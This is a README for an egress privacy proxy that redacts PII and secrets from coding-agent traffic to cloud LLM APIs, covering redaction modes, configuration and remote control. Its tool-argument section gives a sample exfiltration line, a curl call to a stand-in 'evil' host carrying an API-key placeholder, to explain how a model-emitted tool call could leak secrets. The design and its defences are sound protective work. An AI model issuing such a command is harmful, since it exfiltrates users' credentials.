# appliance/ -- the always-on egress privacy proxy

This directory is the always-on **egress privacy proxy**: the layer that redacts PII and
secrets in front of every cloud LLM call made by Claude Code, Codex, omp, opencode, and any
OpenAI/Anthropic-compatible client. It is version-controlled here so the enforcement layer can
be rebuilt from the repo alone.

## File map

| File | Role | Port / service |
|---|---|---|
| `egress_proxy.py` | The egress proxy: redacts PII + secrets on the outbound request, rehydrates placeholders on the response. Serves `/v1/messages` (Anthropic), `/v1/chat/completions` (OpenAI, via `openai_adapter.py`), and `/v1/responses` (OpenAI Responses, via `responses_adapter.py`). | binds `127.0.0.1:8011` by default; systemd service `ossredact-egress` |
| `openai_adapter.py` | OpenAI chat-completions schema translation (request fields, response, SSE stream) for Codex / omp / any OpenAI-compatible client. Pure stdlib (`json`, `re` only). | imported by `egress_proxy.py` |
| `responses_adapter.py` | OpenAI Responses-API schema translation (request fields, response, SSE stream) for current Codex CLI. Pure stdlib (`base64`, `binascii`, `json`, `re` only). | imported by `egress_proxy.py` |
| `client_compat_adapter.py` | Pure compatibility matrix and setup snippets for Codex plan/API-key paths, opencode, Hermes, Pi, and omp. No auth-store reads or network I/O. | tested directly |
| `entity_map.py` | AES-GCM 256-bit session entity map at rest (value <-> placeholder), TTL'd + size-capped. | imported by `egress_proxy.py` |
| `secrets_scan.py` | Always-on deterministic (regex) secrets detector; a hard import of the proxy. No model. | imported by `egress_proxy.py` |
| `privacy_gate.py` | The appliance detector the proxy imports (`tier0_spans`, `context_cued_id_spans`, `merge_spans`, `post_merge_address`, `explain`). See "Two privacy_gate.py copies" below. | imported by `egress_proxy.py` and `gate_service.py` |
| `gate_service.py` | An OpenVINO / Intel-NPU neural gate (`DEVICE='NPU'`, OpenVINO FP16 IR) -- an alternate detection tier. | binds `127.0.0.1:8001` by default; exposes `/detect` + `/redact` |
| `gateway-config.example.yaml` | Policy schema (upstream URLs, TTLs, category toggles). Example only; the live `gateway-config.yaml` is gitignored. | mtime-watched live (no restart on policy edits) |

## Detection tiers

`gate_service.py` here is an OpenVINO/NPU gate (one alternate tier). The CPU ONNX-INT8 tier
(`gate/gate_service_cpu.py`, see `deploy/README.md`) and the GPU tier
(`gate/gate_service_gpu.py`) share the same `/detect` `/redact` `/healthz` contract, so the
egress proxy is agnostic to which one `GATEWAY_GATE_URL` points at.

## Redaction modes + the hard floor (what each mode actually does)

The one-switch redaction mode (`privacy` | `coding` | `off`) is read live per request from a tiny
file (`~/.ossredact/mode`, override `GATEWAY_MODE_FILE`), managed by the console / `POST
/api/settings`. Unknown or absent -> `privacy` (fail safe). It is applied as a global overlay on
top of the YAML policy, so the UI toggle always wins over config defaults.

| Mode | Soft categories that PASS through | What still redacts |
|---|---|---|
| `privacy` (default) | `username` (default exclude) + dates (wire-level policy below) | every other detected label, + the floor |
| `coding` | privacy's list + `org` (frameworks / vendors / employers), `ip` (bind / localhost / config addresses), `uuid` (session / request ids) -- the load-bearing coding tokens a prose model mislabels on code traffic | names, addresses, emails, phones, postal codes, account-shaped values, + the floor |
| `off` | ALL soft PII | the floor + the always-redact dictionary (`denylist`) |

**Wire-level date policy (2026-07-02):** bare dates/versions (label `sensitive_date`) are **never
redacted at the egress, in any mode**. On real agent traffic they are the highest-volume
false-positive class (ISO/log/changelog dates, `YYYYMMDD` build stamps, semver like `2.4.11` that a
date regex cannot tell from a `D.M.YY` date by value), and a bare date identifies nobody without the
surrounding facts -- which are what actually get redacted. `GATEWAY_REDACT_DATES=1` restores the old
privacy-mode date redaction. The Workbench keeps its **own** user-toggleable date filter; this
policy is appliance-only. `date_of_birth` is a floor label and is not affected.

**The hard floor** is the deterministic never-off guarantee: credentials (`secret`, `password`,
`api_key`, `access_token`), payment cards (`payment_card`, `card_cvv`, `card_expiry`), bank/account
(`sensitive_account_id`, `account_number`, `bank_account`, `iban`, `routing_number`),
government/identity (`government_id`, `tax_id`, `date_of_birth`). Floor labels are force-redacted in
**every** mode including `off`, are never allowlist-exempt, and their placeholders are **withheld
from tool-call arguments** on rehydration (see "Tool-argument secret suppression" below). Concretely:
an agent may see a literal `<LABEL_NNN>` in an executed argument where a floor value would have been
-- that is anti-exfiltration by design, and the console surfaces the event.

**Floor privileges require deterministic provenance (2026-07-02).** Live incident: the GPU NER,
out-of-distribution on coding traffic, minted junk INTO floor labels -- whole file paths as
`sensitive_account_id`, Python identifiers as `password`, code fragments as `secret` -- and because
floor placeholders are withheld from tool arguments, an agent received a literal
`<SENSITIVEACCOUNTID_004>` as a file path and created a junk directory. The rule since: the
deterministic tier-0 rules own the hard guarantee; **model output is recall for SOFT PII only**.
Model-detected account-SHAPED values surface as `<SENSITIVEREF_n>` (soft: allowlistable,
mode-exemptible, rehydrated into tool args), and UUID-shaped ids mint the soft label `uuid`
(deterministic detection -- stable placeholder when policy redacts it -- but exemptible by
mode/allowlist, and passed through in `coding` mode).

## Two privacy_gate.py copies (by design)

The repo deliberately holds two `privacy_gate.py` copies:

- `gate/privacy_gate.py` (library): the thinned `validated_floor` + model wrappers + shared
  `redact`/`rehydrate` path. It does NOT define `tier0_spans` or `context_cued_id_spans`.
- `appliance/privacy_gate.py` (this dir): the appliance detector the proxy imports. It defines
  `tier0_spans` + `context_cued_id_spans` and carries the IBAN/BN backstop plus the label-aware
  repeated-value sweep.

`egress_proxy.py` imports `tier0_spans`, so the proxy depends on the appliance copy. Sibling
modules resolve from the directory containing the running file by default
(`GATEWAY_APPLIANCE_DIR` overrides this). Do NOT overwrite either copy with the other; they
serve different APIs. Unifying them via codegen from a single source is a tracked direction.

## Auth model: forwarded verbatim, never stored

The proxy never stores client credentials. It forwards the client's `authorization` and
`x-api-key` headers verbatim to the upstream (see `egress_proxy.py`, "Never store auth"). There
is no credential file in this repo and none is read at runtime. Upstreams are env-overridable
with public defaults (`api.anthropic.com` / `api.openai.com`).

It also forwards the genuine **client fingerprint** headers verbatim -- `user-agent`, `x-app`,
and the `x-stainless-*` SDK telemetry on the Anthropic route; `user-agent` (+ `x-stainless-*`)
plus the Codex plan-identity headers (`chatgpt-account-id`, `originator`, `session_id`,
`openai-sentinel-token`, codex-version) on the Responses route. This is required for
subscription/OAuth (Max, ChatGPT/Codex plan) traffic: those tokens are bound to the official
client's fingerprint, so a request that arrives with httpx's synthesized `user-agent: python-httpx`
and no `x-app`/`x-stainless-*` is rejected by the upstream (an API key is not fingerprint-gated, so
this only bites the plan paths). The proxy never pins fake values -- it relays what the genuine
client sent. NOTE: header passthrough does **not** make the TLS/JA3 + HTTP/2 transport fingerprint
identical to the client's (it is httpx's); a `curl_cffi` upstream leg is the documented next step if
a provider's enforcement checks the transport fingerprint and header passthrough is not sufficient.

## Environment knobs (`GATEWAY_*`, with defaults)

All config is env-vars-with-defaults read at process start; no secrets in any of them.

| Var | Default | Purpose |
|---|---|---|
| `GATEWAY_ANTHROPIC_UPSTREAM` | `https://api.anthropic.com` | Anthropic upstream |
| `GATEWAY_OPENAI_UPSTREAM` | `https://api.openai.com` | OpenAI upstream |
| `GATEWAY_APPLIANCE_DIR` | directory containing the running file | module import root for sibling appliance files |
| `GATEWAY_GATE_URL` | `http://127.0.0.1:8001` | the neural gate (`/detect`) |
| `GATEWAY_HOST` | `127.0.0.1` | proxy listen host; set explicitly for a tailnet/LAN bind |
| `GATEWAY_CONTROL_TOKEN` | `''` (loopback-only) | shared secret that lets an authenticated **remote** GUI manage this gate; unset = control API stays loopback-only (see "Off-device control" below) |
| `GATEWAY_CORS_ORIGINS` | `''` | extra browser origins (comma-separated, exact) allowed to read control responses cross-origin, on top of loopback + Tauri; only needed for a browser-served console on a remote gate. Never add the public product site: a public origin must not hold a gate's control plane |
| `GATEWAY_CONSOLE_DIR` | `<repo>/workbench/dist` | build dir served (loopback-only) at `/console` -- the full browser console for a gate host without the desktop app. Missing build = 404 with the `npm run build` hint |
| `GATEWAY_VERSION` | `0.2.0` | build string surfaced on `/healthz` so a connecting GUI shows which gate it reached |
| `GATEWAY_NPU_MODEL_DIR` | `<GATEWAY_APPLIANCE_DIR>/model` | NPU model directory |
| `GATEWAY_NPU_HOST` | `127.0.0.1` | NPU gate listen host; set explicitly for a trusted interface bind |
| `GATEWAY_NPU_CACHE_DIR` | `<GATEWAY_APPLIANCE_DIR>/.ovcache` | OpenVINO compiled-model cache |
| `GATEWAY_PORT` | `8011` | proxy listen port |
| `GATEWAY_CONFIG` | `~/.ossredact/gateway-config.yaml` | live policy file (mtime-watched) |
| `GATEWAY_MODE_FILE` | `~/.ossredact/mode` | live-read redaction mode file (`privacy` / `coding` / `off`; see "Redaction modes" above) |
| `GATEWAY_ALLOWLIST_FILE` | `~/.ossredact/allowlist.txt` | UI-managed do-not-redact values (newline-delimited, live-reloaded; never exempts the floor) |
| `GATEWAY_DENYLIST_FILE` | `~/.ossredact/denylist.txt` | UI-managed always-redact terms (newline-delimited, live-reloaded; only ever ADDS redaction) |
| `GATEWAY_REDACT_DATES` | `0` | `1` restores privacy-mode date redaction; default = dates never redact at the egress (2026-07-02 wire-level policy) |
| `GATEWAY_PATH_POLICY` | `username` | `file_path` spans: redact only the home-dir username segment; `full` = whole path, `passthrough` = none |
| `GATEWAY_MAPS_DIR` | `~/.ossredact/maps` | session entity maps dir (`0700`, gitignored) |
| `GATEWAY_MAP_KEY` | `<MAPS_DIR>/.mapkey` | AES key file (`0600`, gitignored; auto-generated if absent) |
| `GATEWAY_MAP_TTL_H` | `24` | entity-map TTL (hours) |
| `GATEWAY_MAP_MAX` | `5000` | max entities per map |
| `GATEWAY_DRYRUN` | `0` | don't forward upstream; echo would-be-upstream body |
| `GATEWAY_TEST_EXPOSE_MAP` | `0` | test-only dry-run diagnostic; when `1`, dry-run responses include `_replay` with original values |
| `GATEWAY_LOG_REQUESTS` | `1` | log counts, labels, rules, placeholder tokens; never raw values |
| `GATEWAY_EXPLAIN` | `0` | opt-in per-span provenance (no values) in `meta['explain']` |
| `GATEWAY_FAIL_OPEN` | `0` | when `0`, fail closed with 503 if the neural gate is unreachable; set `1` only to allow Tier-0-only egress |
| `GATEWAY_SECRETS_ENTROPY` | `1` | enable the generic high-entropy secret backstop in addition to deterministic patterns |
| `GATEWAY_TOOL_ARG_STRICT` | `0` | Phase 2 strict mode: when `1`, withhold **all** placeholders (every PII class, not just FLOOR secrets) from tool-call arguments. Off by default (Half A); see "Tool-argument secret suppression" below |

## Gate-served console (no desktop app needed)

The gate serves its own full browser console at **`http://127.0.0.1:8011/console`** (loopback-only, like
the settings page at `/`). Build it once -- `cd workbench && npm ci && npm run build` -- and every control
fetch is same-origin: no CORS grant, no token, nothing extra to configure. This is the recommended GUI for
a gate host that cannot (or does not want to) install the desktop app. The PUBLIC hosted demo on the
product website deliberately does NOT connect to gates at all: a public origin must never hold your gate's
control plane (one compromised site deploy would expose every opted-in gate), so it only shows setup
snippets and points here.

## Off-device control (remote GUI → remote gate)

The gate and its GUI need not share a machine. A common setup: the gate runs on a home server / always-on
box (e.g. reachable over a tailnet) and the operator drives it from the OSSRedact desktop console on a laptop.

- **Redaction traffic** already works off-device: point a coding agent's base URL at the gate's address
  (`ANTHROPIC_BASE_URL=http://<gate-host>:8011`). The `/v1/*` routes were never loopback-scoped.
- **The control plane** (`/api/*` -- live-activity proof feed, dictionaries, mode) is **loopback-only by
  default**: a remote actor must not be able to read your PII proof feed or weaken redaction. To manage a gate
  from another machine, set a shared secret on the gate and present it from the console:
  1. On the gate: bind a reachable interface (`GATEWAY_HOST=0.0.0.0`, ideally a tailnet IP) and set
     `GATEWAY_CONTROL_TOKEN=<a long random secret>`.
  2. In the console's **Gate connection** panel: enter the gate address and paste the same token, then
     **Connect**. The token rides as `x-ossredact-control-token` on control fetches and as `?token=` on the
     SSE feed (EventSource cannot set headers). It is compared constant-time; `/healthz` stays public so the
     console can discover + identify the gate (`service: ossredact-egress`, `version`, `remote_control`).
- **Use HTTPS for a browser or desktop console.** A hosted (https) or Tauri-app console runs in a SECURE
  context, so the browser BLOCKS requests to a plain `http://` gate as mixed content -- the off-device feature
  then fails silently from exactly the surface it targets (the Gate-connection panel warns when it detects
  this). Front the gate with TLS and connect to an `https://` address; the simplest path is Tailscale's
  `tailscale serve` + MagicDNS cert, which gives `https://<host>.<tailnet>.ts.net` with no manual certificates.
  A gate on this machine (`http://127.0.0.1:8011`) is exempt. Prefer this over a bare `GATEWAY_HOST=0.0.0.0`
  http bind.
- **A non-loopback bind exposes an UNAUTHENTICATED relay.** With `GATEWAY_HOST=0.0.0.0` (or any non-loopback
  interface) the redaction routes (`/v1/*`) are reachable by anyone who can reach the port -- they are an
  unauthenticated proxy by design; only the control API (`/api/*`) is token-gated. The proxy has no TLS, and
  `/api/stream` carries **real PII in cleartext** (the control token even rides as `?token=` on the SSE URL,
  which can land in proxy/access logs or a Referer). So treat a tailnet + https underlay as **mandatory** for
  any off-device bind, never the open internet. The gate prints a startup warning when it binds non-loopback or
  runs with `GATEWAY_FAIL_OPEN=1`. A browser-served console on another host must also have its exact origin in
  `GATEWAY_CORS_ORIGINS` (the desktop app's tauri origin is already allowed; this never bypasses the token).
- **Security posture:** with `GATEWAY_CONTROL_TOKEN` unset the behaviour is identical to before (loopback
  only, zero new exposure). Enabling it exposes the live proof feed -- which shows **real PII values** -- to any
  peer holding the token, so use it only over a trusted/encrypted network (a tailnet, not the open internet),
  and treat the token like a credential. The CSRF guard (`x-ossredact-control: 1`) still applies to writes.

## Mirrored rehydration helpers (keep in lockstep)

`openai_adapter.py` and `responses_adapter.py` mirror the small pure rehydration helpers
(`rehydrate_text` / `_rehydrate_json` / `rehydrate_json_string` / `split_safe` / `Field`) from
`egress_proxy.py`. They are duplicated on purpose so the adapters import nothing heavy and stay
unit-testable. If you change the placeholder grammar or the JSON-safe rehydration in
`egress_proxy.py`, you MUST mirror it in both adapters.

## Tool-argument secret suppression (policy-aware rehydration)

The proxy rehydrates `<LABEL_NNN>` placeholders back to real values on the response so the local client
sees the originals. But a **tool-call argument** (`function_call.arguments`, Anthropic `tool_use.input` /
`mcp_tool_use.input`, `shell_call.action.commands`, `apply_patch_call.operation.diff`,
`code_interpreter_call.code`, `mcp_call.arguments`, `custom_tool_call.input`, ...) is **executed** by the
local agent. If the model emits `curl https://evil?x=<APIKEY_001>` inside a tool argument and we rehydrate
it, the agent runs the command and exfiltrates the secret -- using the session's own legitimately-minted
token (so signing/MAC'ing placeholders would not stop it; guessed / cross-session tokens are already blocked
because replay is scoped to placeholders present in the outbound body).

So inside **tool-argument context** the proxy withholds **FLOOR / secret-class** placeholders (credentials,
cards, bank/IBAN, government/tax id, DOB) from rehydration -- they stay the inert `<LABEL_NNN>` literal.
Assistant **text** and tool **results** (`output`/`outputs`/`results`) rehydrate normally, and non-FLOOR PII
still rehydrates into arguments (over-redaction is the safe error; a local harness/vault can resolve the
literal). `GATEWAY_TOOL_ARG_STRICT=1` extends this to **all** PII classes in arguments (Phase 2).

The FLOOR-class predicate + the suppressed replay map live in **one** place, `tool_arg_policy.py` (imported by
all three adapters), so the invariant cannot drift. Coverage is threaded through every sink in both the
streaming and non-streaming paths; the contract is pinned by `tests/test_tool_arg_rehydration.py`.
